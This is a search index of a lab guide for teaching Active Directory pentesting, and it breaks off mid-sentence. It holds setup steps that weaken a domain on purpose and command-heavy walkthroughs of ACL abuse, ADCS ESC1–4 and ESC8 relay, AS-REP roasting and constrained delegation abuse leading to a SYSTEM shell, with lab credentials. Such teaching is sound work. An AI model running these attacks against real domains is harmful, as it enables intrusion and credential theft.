{"config":{"lang":["en"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"]},"docs":[{"location":"","title":"Home","text":"<p>Welcome to the GNS3 AD pentesting lab practical guide. This guide will walk you through deploying an AD pentesting lab within GNS3, and walk you through different attacks that can be perpetrated in the vulnerable AD environment. </p> <p>This guide has walkthroughs to 2 different AD labs: a single-domain lab and a multi-domain lab. The multi-domain lab has a bigger variety of attack scenarios, but is heavier on resources when compared with the single-domain lab.</p> <p>Choose your preferred scenario and start with setting up the lab by navigating to the respective scenario's page through the \"Multi-domain AD Lab\"/\"Single-domain AD Lab\" buttons seen in the upper left corner.</p> <p>This webpage also contains an Active Directory Security report, with comprehensive AD background and detailed attack explanations. Refer to it at any time to learn more about the attacks present in the practical guides. To access it, press the \"Active Directory Extended Report\" button.</p> <p>Have fun!</p>"},{"location":"#labs","title":"Labs","text":"<ul> <li>Single-domain environment Lab</li> <li>Multiple-domain environment Lab</li> </ul>"},{"location":"#contributors","title":"Contributors","text":"<ul> <li>Bernardo Salva\u00e7\u00e3o, Instituto Superior T\u00e9cnico, Universidade de Lisboa</li> <li>Rui Valadas, Instituto Superior T\u00e9cnico, Universidade de Lisboa</li> <li>Filipe Bernardo, Devoteam</li> <li>Bruno Morrison, Devoteam</li> </ul>"},{"location":"report/","title":"Active Directory Extended Report","text":"<p>If the viewer doesn't load on your device, open the PDF here.</p>"},{"location":"labs/dc-configuration/","title":"Domain Controller configuration","text":"<p>The installation and configuration of the DC involves several steps:</p> <ol> <li>Configure the IP addresses and domain name</li> <li>Rename the server</li> <li>Adjust the clock</li> <li>Install the Active Directory</li> <li>Configure DNS</li> <li>Configure users</li> <li>Install and configure IIS</li> <li>Install and configure DHCP</li> <li>Disable SMB signing</li> </ol>"},{"location":"labs/dc-configuration/#configure-the-ip-addresses-and-domain-name","title":"Configure the IP addresses and domain name","text":"<p>Before configuring the IP addresses, you must learn what is the subnet where the NAT cloud is operating. One way of learning is to start the attacker and check the IP address, subnet mask, and gateway it gets from the NAT DHCP server (e.g., using <code>ip add</code> and <code>ip route</code>). In our case, the subnet is <code>198.168.122.0/24</code>, and the gateway is <code>198.168.122.1</code>. Then, the following actions must be performed:</p> <ol> <li>Under <code>Server Manager \u2192 Local Server \u2192 Properties</code> click on the <code>Ethernet</code> link, then on the <code>Ethernet</code> adapter, and finally click <code>Properties \u2192 IPv4</code>.</li> <li>At this window enter <code>IP address</code> as 192.168.122.10, <code>subnet mask</code> as 255.255.255.0, <code>default gateway</code> as 192.168.122.1, and <code>DNS servers</code> as 192.168.122.10 and 8.8.8.8.</li> <li>Click <code>Advanced</code>, select the <code>DNS</code> tab, and in the box <code>DNS suffix for this connection</code> write polaris.local.</li> <li>Apply all the changes and return to the <code>Server Manager</code> window.</li> </ol>"},{"location":"labs/dc-configuration/#rename-the-server","title":"Rename the server","text":"<ol> <li>Change the name of the server to DC1. This can be done in the <code>Control Panel</code> under <code>System</code>. Restart the computer to apply the changes.</li> </ol>"},{"location":"labs/dc-configuration/#adjust-the-clock","title":"Adjust the clock","text":"<ol> <li>Make sure that the time zone, the date, and the time are correctly set. The time zone must be set to UTC. The date and time must be close to the attacker\u2019s one. The easiest way is to make the adjustments in the Control Panel.</li> </ol>"},{"location":"labs/dc-configuration/#install-the-active-directory","title":"Install the Active Directory","text":"<ol> <li>In the <code>Server Manager</code>, click <code>Manage \u2192 Add Roles and features</code>, then click <code>Next</code> until reaching the <code>Server Roles</code> tab.</li> <li>Check the <code>Active Directory Domain Services</code> box, click <code>Add features</code> and click <code>Next</code> until the <code>Confirmation</code> tab appears. At this tab click <code>Install</code>.</li> <li>After the installation, click <code>Promote this server to a domain controller</code>.</li> <li>Select <code>Add a new forest</code> and write polaris.local in the <code>Root Domain name</code> box. Then click <code>Next</code>.</li> <li>Enter the password for the DSRM administrator account. Then click <code>Next</code> until the <code>Prerequisites</code> tab appears and click on <code>Install</code>.</li> </ol>"},{"location":"labs/dc-configuration/#configure-dns","title":"Configure DNS","text":"<ol> <li>Go back to the IP address configuration window and reconfigure the <code>DNS servers</code> as 192.168.122.10 and 8.8.8.8. Apply the changes and return to the <code>Server Manager</code> window.</li> <li>Click <code>Tools \u2192 DNS \u2192 DC1</code>.</li> <li>Right-click on <code>Reverse Lookup Zones</code>, then click <code>New Zone \u2192 Next \u2192 Primary zone \u2192 Next</code> and select <code>To all DNS servers running... in this forest: polaris.local</code>.</li> <li>Click <code>Next \u2192 IPv4 Reverse Lookup Zone \u2192 Next</code>. In <code>NetworkID</code> box enter 192.168.122. Then click <code>Next \u2192 Next \u2192 Finish</code>. A new entry should have appeared in the <code>Reverse Lookup Zones</code> tab.</li> </ol>"},{"location":"labs/dc-configuration/#configure-users","title":"Configure users","text":"<p>To configure one user, in the <code>Server Manager</code> click <code>Tools \u2192 Active Directory Users and Computers \u2192 Action \u2192 New \u2192 User</code>. Then, enter the user credentials. Uncheck the option <code>User must change password at next logon</code>. You must create four users with different characteristics, as indicated in the next table.</p> User logon name Password Domain Description darlene.alderson M00npie polaris.local Account with an associated SPN leslie.romero RGFyayBBcm15 polaris.local Password in description leon Password123 polaris.local Weak password angela.moss Jogging1988 polaris.local Kerberos pre-authentication disabled admin Passw0rd polaris.local Administrator account <ol> <li>User angela.moss must be configured with the pre-authentication disabled. To do that access the user <code>Properties</code> (e.g., double-click over the username in the <code>Active Directory Users and Computers</code> window) and in the <code>Account tab \u2192 Account options</code> box check <code>Do not require Kerberos preauthentication</code>.</li> <li>User leslie.romero must be configured with a password in the description. In the <code>General tab \u2192 Description</code> box write <code>DELETE THIS LATER! Password: RGFyayBBcm15</code>.</li> <li>The account of darlene.alderson must have an associated SPN. To perform this configuration, click <code>Tools \u2192 ADSI Edit \u2192 Action \u2192 Connect</code>. Then in <code>DC=polaris,DC=local \u2192 CN=Users</code> search for <code>CN=darlene alderson</code>. Right-click on this CN, select <code>Properties</code> and in the <code>Attribute Editor</code> tab search for <code>servicePrincipalName</code>. Select the attribute, click <code>Edit</code> and insert <code>http/polaris.local:80</code> in the <code>Value to add</code> box.</li> </ol>"},{"location":"labs/dc-configuration/#install-and-configure-iis","title":"Install and configure IIS","text":"<ol> <li>In the <code>Server Manager</code>, click <code>Manage \u2192 Add Roles and features</code>, then click <code>Next</code> until reaching the <code>Server Roles</code> tab.</li> <li>Check the <code>Web Server(IIS)</code> box, click <code>Add features</code> and click <code>Next</code> until reaching the <code>Role Services</code> tab.</li> <li>Check the <code>Windows Authentication</code> box which is one of the <code>Security</code> options. Then click <code>Next</code> until the <code>Confirmation</code> tab appears. At this tab click <code>Install</code>.</li> <li>Click <code>Tools \u2192 Internet Information Services (IIS) Manager</code>, on the left window open <code>DC1 (Polaris\\Administrator)</code> and then <code>Sites</code>, click above <code>Default Web Site</code>, on the center window double-click over Authentication. Here disable Anonymous Authentication and enable Windows Authentication.</li> <li>On the right window open <code>Providers</code> and make sure that <code>Negotiate</code> is above <code>NTLM</code>. This ensures that Kerberos is selected first as the authentication method, and NTLM is used if Kerberos fails.</li> <li>On the left window select <code>Application Pools</code>, on the center window click over <code>DefaultAppPool</code>, and on the right window open <code>Advanced Settings</code>. Confirm that the <code>Identity</code> attribute is set to <code>ApplicationPoolIdentity</code>.</li> <li>On the left window select <code>Default Web Site</code>, and on the center window double-click over <code>Configuration Editor</code>. Then, in the dropdown menu select <code>system.webServer \u2192 security \u2192 authentication \u2192 windowsAuthentication</code>. Here, set <code>useAppPoolCredentials</code> to <code>False</code> and <code>useKernelMode</code> to <code>True</code>.</li> </ol>"},{"location":"labs/dc-configuration/#install-and-configure-dhcp","title":"Install and configure DHCP","text":"<ol> <li>In the <code>Server Manager</code>, click <code>Manage \u2192 Add Roles and features</code>, then click <code>Next</code> until reaching the <code>Server Roles</code> tab.</li> <li>Check the <code>DHCP Server</code> box, click <code>Add features</code> and click <code>Next</code> until the <code>Confirmation</code> tab appears. At this tab click <code>Install</code>. This completes the installation of the DHCP server.</li> <li>To configure the DHCP server click <code>Tools \u2192 DHCP</code>, on the left window open <code>dc1.polaris.local</code>, right-click <code>IPv4</code>, and select <code>New Scope</code>. In the <code>Scope Name</code> window give a name to the scope, in the <code>IP Address Range</code> window configure the <code>start IP address</code>, the <code>end IP address</code>, and the subnet mask of the DHCP range (we suggest <code>192.168.122.1</code>, <code>192.168.122.254</code>, and <code>255.255.255.0</code>), in the <code>Add Exclusion and Delay</code> window exclude an IP address range to be used by attackers (we suggest <code>192.168.122.15 to 192.168.122.20</code>), in the <code>Configure DHCP Options</code> window select <code>Yes, I want to configure these options now</code>, in the <code>Router (Default Gateway)</code> window configure the IP address of the default gateway (<code>192.168.122.1</code>), in the <code>Domain Name and DNS Servers</code> window configure the parent domain as <code>polaris.local</code>, and the IP addresses of the DNS servers as <code>192.168.122.10</code> and <code>8.8.8.8</code>. Finally, in the <code>Activate Scope</code> window select <code>Yes, I want to activate this scope now</code>, click <code>Next \u2192 Finish</code>. At this point the corresponding Scope folder is added to the IPv4 section.</li> </ol>"},{"location":"labs/dc-configuration/#disable-smb-signing","title":"Disable SMB signing","text":"<p>(Only required for the SMB relay attack)</p> <p>To disable the SMB signing you will have to change the Registry. In the <code>Server Manager</code>, click on <code>Tools \u2192 Registry Editor</code> and set to <code>0</code> the following attributes:</p> <ul> <li><code>RequireSecuritySignature of HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Services\\LanManWorkstation\\Parameters</code></li> <li><code>EnableSecuritySignature of HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Services\\LanManWorkstation\\Parameters</code></li> <li><code>RequireSecuritySignature of HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Services\\LanManServer\\Parameters</code></li> <li><code>EnableSecuritySignature of HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Services\\LanManServer\\Parameters</code></li> </ul>"},{"location":"labs/multi-domain-attacks/ACLAbuse/","title":"ACLs","text":"<p>WAD uses ACLs in what are called object's Security Descriptors in order to define object access. These ACLs hold information on which Security Principals have what type of access to the object in question. ACLs can be exploited by attackers. For example, imagine that the attacker compromises an account A, and this account A holds determined access rights to an object B. This way, if access rights are powerful enough, the attacker may also compromise object B using account A. This is the basic principle of ACL attacks. Now, let's get to concrete examples.</p> <p>We've previously gathered information and uploaded it to BloodHound on the BloodHound section. Let's query our information for ACL paths, to get a better look at what can be done. Use the following Cypher query: <pre><code>MATCH p=(u)-[r1]-&gt;(n)\nWHERE r1.isacl = true\n  AND u.admincount = false\n  AND NOT toLower(u.name) CONTAINS 'key'\n  AND toLower(u.domain) = \"north.altair.local\"\n  AND NOT toLower(u.name) CONTAINS 'ras and ias servers'\n  AND NOT toLower(n.name) CONTAINS 'ras and ias servers'\n  AND NOT toLower(u.name) CONTAINS 'samaccountname'\n  AND NOT toLower(n.name) CONTAINS 'samaccountname'\nRETURN p\n</code></pre></p> <p>This shows us different nodes and links. These nodes are our Security Principals, and the links between them represent different access rights, defined by ACLs. Through the BloodHound GUI we can determine that there's a path from the Skyler White user, all the way to the CAPTAIN machine! First, we notice that Skyler has a 'ForceChangePassword' link to Jesse. This indicates that Skyler can change Jesse's password! Since we've compromised Skyler's account earlier, we can now compromise Jesse's by changing it's current password: <pre><code>net rpc password jesse.pinkman -U north.altair.local/skyler.white%Password123 -S captain.north.altair.local\n#introduce the password, for example ThisIsANewPassword10\n#now confirm if the password was correctly altered\ncrackmapexec smb 192.168.122.10 -u jesse.pinkman -d north.altair.local -p ThisIsANewPassword10\n</code></pre> From jesse\u2019s account, we can compromise walter.white\u2019s account, since jesse holds the 'GenericWrite' access right over it. This means that Jesse can alter Walter's attributes. This allows for the Shadow Credentials attack, seen in our ADCS section. We can therefore  retrieve Walter's hashes and a TGT in his name through this attack, as Jesse. <pre><code>certipy shadow auto -u jesse.pinkman@north.altair.local -p ThisIsANewPassword10 -account 'walter.white'\n</code></pre></p> <p>And we've compromised Walter's account! Let's see what we can do from here. It seems Walter has the ability of modifying Hank's own ACL! This means the attacker, as Walter, can give theirself other types of access to Hank, such as 'FullControl' access! Then, we can perform the Shadow Credentials attack once more, as 'FullControl' access gives Walter (yes, you've guessed it) full control over Hank's user account! One can also change Hank's password as we've done before. I'll let you decide this one for yourself.</p> <pre><code>#we can check walter's current rights on hank, please use set the KRB5CCNAME env var to the .ccache file retrieved in the last step\ndacledit.py -no-pass -hashes :&lt;NT hash from previous attack&gt; -action 'read' -principal walter.white -target 'hank.schrader' 'north.altair.local'/'walter.white'\n#add FullControl right to walter\ndacledit.py -no-pass -hashes :&lt;NT hash from previous attack&gt; -action 'write' -rights 'FullControl' -principal walter.white  -target 'hank.schrader' 'north.altair.local'/'walter.white'\n#we can check walter's new access rights on hank's account\ndacledit.py -no-pass -hashes :&lt;NT hash from previous attack&gt; -action 'read' -principal walter.white -target 'hank.schrader' 'north.altair.local'/'walter.white'\n#you can use the shadow credentials attack once again, this time using walter's account and targeting hank's\ncertipy shadow auto -u walter.white@north.altair.local -hashes :&lt;NT hash from previous attack&gt; -account 'hank.schrader'\n</code></pre> <p>Once you've compromised Hank's account, you can use it to add members to the 'Masters' security group! It seems that this group has 'GenericAll' access rights over the DC!</p> <p><pre><code># Add skyler.white to the Masters group\nldeep ldap -u hank.schrader -H ':&lt;NT hash from previous attack&gt;' -d north.altair.local -s ldap://192.168.122.10 add_to_group \"CN=Skyler White,CN=Users,DC=north,DC=altair,DC=local\" \"CN=Masters,CN=Users,DC=north,DC=altair,DC=local\"\n\n#Confirm that skyler is now part of the masters group\nldeep ldap -u hank.schrader -H ':&lt;NT hash from previous attack&gt;' -d north.altair.local -s ldap://192.168.122.10 membersof 'Masters'\n</code></pre> Now, all thanks to misconfigured ACLs with over-permissive access rights granted to low-privileged accounts,  the attacker can compromise the domain: <pre><code>certipy shadow auto -u skyler.white@north.altair.local -p 'Password123' -account 'captain$'\n#now you can use the secretsdump.py script with either the hashes or the TGT received from the shadow credentials attack\n</code></pre></p> <p>Question</p> <p>How could these permissions have been configured more securely to prevent privilege escalation through ACLs?</p> Answer <p>Permissions should follow the principle of least privilege. Only the minimum rights necessary should be granted. For example, avoiding giving low-privileged accounts rights like ForceChangePassword, GenericWrite, or GenericAll over higher-privileged accounts.</p> <p>Question</p> <p>What would be the real impact on the organization if an attacker exploited this ACL chain up to the Domain Controller?</p> Answer <p>Full compromise of the DC effectively gives the attacker control over the entire Active Directory domain. This means the ability to impersonate any user, maintain persistent access, and more. Essentially, this is game over for the organization\u2019s AD domain.</p> <p>Question</p> <p>Is the BloodHound tool only helpful for attackers in this scenario?</p> Answer <p>No. BloodHound is valuable for both attackers and defenders. While attackers can use it to map privilege escalation paths and exploit misconfigurations, defenders can leverage it to audit AD environments, identify excessive permissions, and remediate risky ACLs before they are abused. When integrated into security audits, BloodHound becomes a powerful defensive tool.</p>"},{"location":"labs/multi-domain-attacks/AD-Reconnaissance/","title":"Anonymous AD Reconnaissance","text":"<p>Once different machines and services are identified, the attacker may then begin reconnaissance of AD information. Information such as different users and accessible shares. Sometimes, this information is available to unauthenticated users, and thus without any valid credentials, an attacker may potentially access it.</p> <p>First, let's try to anonymously enumerate AD users from the north.altair.local domain: <pre><code>crackmapexec smb 192.168.122.10 --users\n</code></pre> It seems that the CAPTAIN DC allows its users to be anonymously enumerated. This gives the attacker a great advantage. It also seems that one of the user's has his password in the description. Just like this, the attacker has gained an initial foothold on the domain.</p> <p>We can try and do the same on other DCs (KING and CHIEF): <pre><code>crackmapexec smb 192.168.122.20 --users\ncrackmapexec smb 192.168.122.30 --users\n</code></pre></p> <p>Hmmm, no luck here, seems like altair's and sirius' administrators don't slack off as much.</p> <p>Another thing that the attacker can do without credentials is listing shares. In AD there's a 'Guest' account, often without password and with very limited privileges. One of those privileges normally is the possibility to enumerate shares. Who knows, maybe the Guest account can even access one or two.</p> <p><pre><code>crackmapexec smb 192.168.122.10 -u 'a' -p '' --shares\n</code></pre> Using the Guest account, we can see the different shares available in CAPTAIN. We even have access to one of them! Let's take a look:</p> <p><pre><code>smbclient //192.168.122.10/SharingIsCaring -U guest\n#Press 'ENTER' when the password is requested\nls \nget skyler.txt\nexit\ncat skyler.txt\n</code></pre> Seems like Skyler's not very good with passwords. Maybe we can guess it down the road?</p> <p>Question</p> <p>How many File Shares are available in CAPTAIN?</p> Answer <p>There are seven file shares in CAPTAIN. The guest account can read and write one of them: SharingIsCaring.</p> <p>Question</p> <p>How many users are there in the north.altair.local domain? Which one has left their password on the description?</p> Answer <p>Through anonymous enumeration, the attacker found 7 user accounts. The saul.goodman user account's password can be seen in its description.</p>"},{"location":"labs/multi-domain-attacks/ADCSExploiting/","title":"ADCS Exploiting","text":"<p>Active Directory Certificate Services is Microsoft's Public Key Infrastructure implementation for Active Directory environments. It allows organizations to issue, manage, and validate various digital certificates. These certificates can be used for user/computer logon, email/file encryption, signing, and Kerberos authentication.</p> <p>ADCS misconfigurations may lead to possible attack vectors, as we'll see in this section. ADCS related attacks are also named ESC (Enterprise Security Configuration) attacks. There are many ESC attacks. This section will only illustrate some of these.</p> <p>As a first step to attack AD through the Certificate Services, an attacker should first assess ADCS information, such as the CA (Certificate Authority) name, as well as the templates issued by the CA, in order to look for some vulnerable templates and CA configurations. To do so, the certipy tool may be used:</p> <p><pre><code>certipy find -u skyler.white@north.altair.local -p 'Password123' -vulnerable -dc-ip 192.168.122.10 -stdout\n</code></pre> This will output various information to stdout. We can see that the CA is called North Root CA, and that it is vulnerable to ESC1-4 and ESC8 attacks.</p> <p>The ESC8 attack is possible since the CA allows web enrollment. This means that users are allowed to request certificates by authenticating through the network. As we've explored on other attacks, we can relay NTLM authentication from a client to a server and impersonate the client against the legitimate server. In this case, let's relay NTLM messages from the DC itself to the CA (which is being hosted by MEMBER), and this way, retrieve a certificate as the DC itself. The certificate can then be used to obtain a TGT issued for the DC account. This allows the attacker to impersonate the DC through its TGT. <pre><code>#start the relay in terminal 1\ncertipy relay -target 192.168.122.5 -ca 192.168.122.5 -template DomainController \n#trigger NTLM dc authentication from terminal 2\npython3 printerbug.py NORTH/skyler.white:Password123@192.168.122.10 192.168.122.2 \n#now, you should have acquired a certificate through the certipy script. use it to get a TGT as the DC\ncertipy auth -pfx captain.pfx -dc-ip 192.168.122.10\n</code></pre></p> <p>ESC1-4 are related to misconfigured templates, rather than a misconfigured CA. On an ESC1 attack, an attacker takes advantage of the fact that there's a template that allows the enrollee to supply a SubjectAltName (SAN). This SAN identifies to whom this certificate is being issued to. It basically allows the attacker to say \"Hey, I'm asking for this certificate, but it's actually for the administrator, not me. So go ahead and issue a certificate on the administrator's behalf, I'll take care of the rest.\". Since the template allows the attacker to supply a SAN, the CA issues this certificate in the administrator's name and sends it to the attacker.</p> <pre><code>#retrieve the certificate\ncertipy req -u skyler.white@north.altair.local -p 'Password123' -target 192.168.122.5 -template ESC1 -ca 'North Root CA' -upn administrator@north.altair.local\n#now use the certificate to authenticate as the administrator\ncertipy auth -pfx administrator.pfx -dc-ip 192.168.122.10 \n</code></pre> <p>When it comes to ESC2 and ESC3 templates, these are configured with the 'Any Purpose' EKU and 'Certificate Request Agent' EKUs, respectively. EKU stands for Extended Key Usage, and it determines the uses that a template has. These two EKUs allow a user to use the certificates to request other certificates in name of other users. Having these EKUs set on certificate to which low-privilege users can enroll open ways for ESC2(Any Purpose EKU) and ESC3(Certificate Request Agent EKU) attacks:</p> <pre><code>#request the certificate template with over permissive EKUs. can be either ESC2 or ESC3\ncertipy req -u skyler.white@north.altair.local -p 'Password123' -target 192.168.122.5 -template ESC2 -ca 'North Root CA'\n#use the certificate to request another certificate on behalf of another user\ncertipy req -u skyler.white@north.altair.local -p 'Password123' -target 192.168.122.5 -template User -ca 'North Root CA' -on-behalf-of 'north\\administrator' -pfx skyler.white.pfx\n#retrieve a tgt for the administrator user\ncertipy auth -pfx administrator.pfx -dc-ip 192.168.122.10\n</code></pre> <p>Finally, the ESC4 attack is possible when the attacker has compromised an account that holds write permissions over a certificate template. By being able to modify a certificate template, the attacker can alter its configuration, and for example, allow the enrollee to supply a SAN (ESC1 attack):</p> <pre><code>#Modify the ESC4 certificate template to allow SANs in the request while saving the old certificate template\ncertipy template -u skyler.white@north.altair.local -p 'Password123' -template ESC4 -dc-ip 192.168.122.10 -target 192.168.122.10 -save-old\n#get a certificate for impersonating the administrator through the ESC1 attack, which the ESC4 template is now vulnerable to\ncertipy req -u skyler.white@north.altair.local -p 'Password123' -target 192.168.122.5 -template ESC4 -ca 'North Root CA' -upn administrator@north.altair.local\n#get a tgt using the template\ncertipy auth -pfx administrator.pfx -dc-ip 192.168.122.10 \n#modify the template once again, setting it back to its old configuration\ncertipy template -u skyler.white@north.altair.local -p 'Password123' -template ESC4 -dc-ip 192.168.122.10 -target 192.168.122.10 -configuration ESC4.json\n</code></pre> <p>Question</p> <p>How can an administrator prevent ESC8 attacks?</p> Answer <p>The admins can prevent these attacks by disabling CA web enrollment, or by mitigating relay attacks themselves, through enabling SMB signing on CA servers, which would also prevent this attack.</p> <p>Question</p> <p>How does ESC1 lead to impersonation of any user, including Domain Admins?</p> Answer <p>In an ESC1 attack, the certificate template is misconfigured to allow the enrollee to specify the Subject Alternative Name (SAN). Since the SAN defines the identity the certificate represents, an attacker can simply request a certificate where the SAN is set to a privileged account, like Administrator. The CA issues the certificate without verifying ownership, giving the attacker valid credentials to impersonate that account.</p> <p>Question</p> <p>What's the difference between ESC2 and ESC3 attacks?</p> Answer <p>The Extended Key Usage values are different. In ESC2, the template has an 'Any Purpose' EKU, which means the certificate can be used for anything, while ESC3 has the 'Certificate Request Agent' EKU which is more granular, but still the EKU that allows to perpetrate these attacks.</p>"},{"location":"labs/multi-domain-attacks/AS-REPRoasting/","title":"AS_REP Roasting","text":"<p>This attack targets user accounts that are configured to not use pre-authentication in Kerberos authentication. The first step in Kerberos is to retrieve a TGT on the user's behalf. To do so, normally, user's must pre-authenticate themselves. This pre-authentication step proves the user has knowledge of its own password, and allows the user to retrieve a TGT.</p> <p>When pre-authentication isn't required for some user, they do not need to provide their password to retrieve a TGT. Thus, an attacker without password knowledge can retrieve TGTs for users with no pre-authentication required. </p> <p>The TGT is only usable if the user has password knowledge. The AS-REP message sent to the user contains both a TGT and an encrypted section. The latter section is encrypted using the user's password. Thus, the attacker's objective isn't simply retrieving the TGT (the attacker doesn't know the password so they can't use it), but instead, discover the user's password through offline cracking of the AS-REP encrypted section.</p> <p>Once the attacker retrieves the AS-REP message, it can use a list of common passwords to attempt and decrypt the password-encrypted section. If some password is able to decrypt this section, it means that the password belongs to the user to whom the AS-REP was issued.</p> <p>To execute this attack, use the north_users2.txt file, and run the Impacket script:</p> <pre><code>GetNPUsers.py north.altair.local/ -no-pass -usersfile north_users2.txt -outputfile asrep.hash\n</code></pre> <p>It seems that we were able to retrieve an AS-REP for Jesse, as Jesse does not require Kerberos' pre-authentication. Now we can attempt to crack its password-encrypted section offline using hashcat. Hashcat and GNS3 VMs don't get along very well. My suggestion is to install Hashcat on your own machine, retrieve the cipher text from asrep.hash file, as well as the passwords.txt file, and execute the following command:</p> <pre><code>hashcat -m 18200 asrep.hash passwords.txt -o cracked1.txt --force --quiet\n</code></pre> <p>You should be able to retrieve Jesse's password this way.</p> <p>Question</p> <p>What message does an attacker receive when they send an AS-REQ without pre-authentication to a user that does not require pre-authentication? What does an attacker receive in the case the user does require pre-authentication?</p> Answer <p>In case the user does not require pre-auth: an AS-REP message containing the user's TGT. If otherwise the user requires pre-auth: a Kerberos error message (KRB5KDC_ERR_PREAUTH_REQUIRED).</p> <p>Question</p> <p>Can the attacker use the user's TGT right away? Why?</p> Answer <p>No. In order to use the TGT, the attacker must have access to a session key that is sent in the AS-REP message. This session key is in turn encrypted using a user's password derived key, which the attacker has no access to. Therefore the attacker cannot use the TGT.</p> <p>Question</p> <p>How does the attacker know if they have successfully cracked the password?</p> Answer <p>The attacker knows the password is correct due to the TGT having recognizable fields including the realm name, timestamp, and client principal name. When the correct key (derived from the cracked password) is used to decipher the TGT, these fields are properly parsed, confirming the password is valid. Hashcat's job is to derive the key from a potential password, try decrypting the AS-REP encrypted section, and assess if there are recognizable fields. If there are, the password used to derive the key is the user's password.</p> <p>Question</p> <p>Does the attacker need credentials to perpetrate this attack?</p> Answer <p>Yes, the attacker needs to know valid usernames in order to perpetrate this attack. However, the attacker does not need to know passwords, which are part of the credentials.</p>"},{"location":"labs/multi-domain-attacks/BloodHound/","title":"BloodHound","text":"<p>BloodHound is a very important tool in AD pentesting, both from an offensive as well as a defensive point of view. In this section, we'll go through setting it up and using it.</p> <p>First, you'll have BH's configuration in /home/ubuntu/.config/bloodhound. There, you'll have the 'docker-compose.yml' file which defines the containers and service needed to run BH via Docker (which we're doing). In this dir you can dispose the containers, or start them (you probably don't have to unless you've restarted the attacker machine):</p> <pre><code>#in /home/ubuntu/.config/bloodhound/\n#command to dispose of the docker containers\ndocker-compose down -v\n#command to set up the required containers to run BH\ndocker-compose up -d\n</code></pre> <p>Once containers have started, you can access them through HTTP from your host machine. Doing so in Linux is easier, but it is also possible in Windows, as long as you can communicate through the network from your host machine to the Attacker VM running in GNS3. To access the BH GUI, once you can communicate with the 'Attacker' GNS3 VM, just use your browser and access \"http://192.168.122.2:8080/ui/login\". If you cannot connect straight away, wait for a while and hit refresh. </p> <p>In this page, you'll authenticate as the 'admin' user. You'll need a password though. To retrieve the password and login as admin do the following: <pre><code>#in /home/ubuntu/bloodhound-install/\n./bloodhound-cli config get default_password\n#take note of the password\n</code></pre></p> <p>You'll have to reset the password. Pick your favourite. At this point you should have logged in BH. You should be presented a warning telling you that there's no data uploaded yet. Let's take care of that.</p> <p>To do so, we'll use the 'bloodhound.py' ingestor. This script uses valid user credentials to query the domain using LDAP and retrieve JSON files ready to be uploaded to BH. Let's get to it:</p> <p><pre><code>#in /home/ubuntu/BloodHoundIngestor/\npython3 bloodhound.py --zip -c All -d north.altair.local -u skyler.white -p Password123 -dc captain.north.altair.local \npython3 bloodhound.py --zip -c All -d altair.local -u lily.aldrin -p ThisIsMyPassword123 -dc chief.altair.local \npython3 bloodhound.py --zip -c All -d sirius.local -u pam.beesly -p IDontKnow? -dc king.sirius.local \n</code></pre> These commands will produce 3 different .zip files containing JSON files with AD information ready to be uploaded to BH. Let's upload them:</p> <pre><code>mkdir /home/ubuntu/BHCEupload/bhfiles\nmv /home/ubuntu/BloodHoundIngestor/*.zip /home/ubuntu/BHCEupload/bhfiles\ncd /home/ubuntu/BHCEupload/\n</code></pre> <p>In your current directory, there's a Golang tool used to upload these files to BH. In order to use it you need to do the following: Access BH's GUI and navigate to the \"Profile\" tab, on the left. Then click \"API Key Management\", followed by \"Create Token\". Give it a name, click \"Save\" and take note of both the Key and ID values presented to you before closing this window.</p> <p>Now, to upload the files: <pre><code>#in /home/ubuntu/BHCEupload/\n./BHCEupload -tokenid &lt;token-ID&gt; -tokenkey &lt;token-key&gt; -dir ./bhfiles/ -url http://192.168.122.2:8080\n</code></pre></p> <p>At this point, the data retrieved using 'bloodhound.py' was uploaded and can now be accessed through the GUI. It may take a while for the data to be accessible through the GUI. You can head back to the \"Explore\" tab using the left panel, and navigate through information using BloodHound!</p> <p>To start you off, you can use the following Cypher queries: <pre><code>#presents the different domains and domain joined machines\nMATCH p = (d:Domain)-[r:Contains*1..]-&gt;(n:Computer) RETURN p\n#presents the different domains and respective user accounts\nMATCH p = (d:Domain)-[r:Contains*1..]-&gt;(n:User) RETURN p\n#presents the overall map of domains, groups and users\nMATCH q=(d:Domain)-[r:Contains*1..]-&gt;(n:Group)&lt;-[s:MemberOf]-(u:User) RETURN q\n</code></pre></p> <p>The BloodHound tool will aid us in further attacks, such as ACL and GPO abuse.</p>"},{"location":"labs/multi-domain-attacks/ConstrainedDelegationAbuse/","title":"Constrained Delegation Abuse","text":"<p>Misconfigured constrained delegation rights may lead to domain compromise. This abuse doesn't necessarily take advantage of a vulnerability or a bug, but rather from misconfigurations. The attacker simply takes advantage of them.</p> <p>Upon acquiring valid user credentials, an attacker may look for delegation rights configured in a domain. This way, an attacker can target valuable accounts, such as accounts that are configured for constrained delegations for sensitive services, such as the SMB/CIFS service running on a domain controller.</p> <p>The attacker can look for configured delegation rights by using Impacket's 'findDelegation.py' script: <pre><code>findDelegation.py NORTH.ALTAIR.LOCAL/skyler.white:Password123 -target-domain north.altair.local\n</code></pre> The output of this script shows us that Walter is configured for constrained delegation, being able to delegate tickets to the SMB service running on the domain controller! This means that if the attacker can compromise Walter's account, they can impersonate the administrator account and access this service as the administrator! This is possible thanks to the S4U2Self and S4U2Proxy protocol extensions used in Kerberos' constrained delegation.</p> <p>In the Kerberoasting section of the lab we've targeted Walter's account, and cracked his password using Hashcat (hopefully). If you haven't been able to crack Walter's password, I'll let you in on it: 'Metho1o590oA$elry'.</p> <p>Since we've compromised Walter's account, we can now take advantage of this misconfiguration where a low-privileged account has delegation rights to a sensitive service: <pre><code>#retrieve a ticket for the CIFS service in the domain controller as the admin through S4U2Self and S4U2Proxy\ngetST.py -spn 'CIFS/captain.north.altair.local' -impersonate Administrator -dc-ip '192.168.122.10' 'north.altair.local/walter.white:Metho1o590oA$elry'\n#set the krb5ccname environment var to the new ccache file\nexport KRB5CCNAME=/home/ubuntu/Administrator.ccache\n#use the ticket to access the domain controller through a shell as the administrator through the SMB protocol\npsexec.py  -k -no-pass NORTH.ALTAIR.LOCAL/Administrator@captain.north.altair.local\n</code></pre></p> <p>And just like that we can issue commands in the DC as SYSTEM by leveraging a TGS issued on the Administrator behalf! By abusing a misconfigured delegation right, a low-privileged user escalated directly to Domain Admin, without needing to exploit any vulnerability.</p> <p>Question</p> <p>What's S4U2Self and S4U2Proxy role in this attack?</p> Answer <p>The attacker, using Walter's account, can use the S4U2Self extension in order to request a 